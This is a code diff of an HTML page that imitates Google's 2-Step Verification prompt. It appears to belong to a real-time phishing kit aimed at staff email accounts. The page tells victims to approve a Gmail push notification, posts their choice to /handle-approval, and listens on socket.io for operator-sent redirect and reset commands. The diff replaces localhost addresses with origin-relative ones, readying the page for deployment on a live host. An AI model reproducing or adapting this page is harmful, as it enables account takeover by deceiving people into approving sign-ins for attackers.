@@ -1,26 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <title>Confirm Action Request</title>
-    <!-- LOAD THE LOCAL LIVE SERVER SOCKET LIBRARY -->
-    <script src="http://localhost:3000/socket.io/socket.io.js"></script>
+
+
+    <script src="/socket.io/socket.io.js"></script>
+
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding-top: 120px; background-color: #f3f4f6; }
-        .box { background: white; padding: 40px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 350px; }
-        .flex { display: flex; justify-content: space-around; margin-top: 30px; gap: 10px; }
-        .choice-btn { padding: 12px 35px; font-size: 16px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; color: white; width: 120px; }
-        .approve { background-color: #2ecc71; }
-        .deny { background-color: #e74c3c; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 120px;
+            background-color: #f3f4f6;
+        }
+
+        .box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            display: inline-block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+
+        .flex {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+            gap: 10px;
+        }
+
+        .choice-btn {
+            padding: 12px 35px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            color: white;
+            width: 120px;
+        }
+
+        .approve {
+            background-color: #2ecc71;
+        }
+
+        .deny {
+            background-color: #e74c3c;
+        }
     </style>
 </head>
+
 <body>
 
     <div class="box">
         <h2>2-Step Verification</h2>
         <p>Open the Gmail app on your Device
-            <br>Google sent a notification to your Device. Open the Gmail app and tap Yes on the prompt to verify it’s you.</p>
-        
+            <br>Google sent a notification to your Device. Open the Gmail app and tap Yes on the prompt to verify it’s
+            you.
+        </p>
+
         <div class="flex">
             <form action="/handle-approval" method="POST">
                 <input type="hidden" name="status" value="yes">
@@ -31,8 +72,10 @@
     </div>
 
     <script>
-        // Connect directly via absolute path link
-        const socket = io("http://localhost:3000");
+
+
+        const socket = io();
+
         let currentEmail = localStorage.getItem('active_staff_email') || "";
         document.querySelectorAll('.email_context').forEach(elem => elem.value = currentEmail);
 
@@ -50,11 +93,15 @@
         socket.on("redirect_command", (destinationUrl) => {
             if (destinationUrl === "/force_reset_kick") {
                 localStorage.removeItem('active_staff_email');
-                window.location.href = "http://localhost:3000/";
+
+                window.location.href = window.location.origin + "/";
             } else {
-                window.location.href = "http://localhost:3000" + destinationUrl; 
+
+                window.location.href = window.location.origin + destinationUrl;
             }
+
         });
     </script>
 </body>
+
 </html>
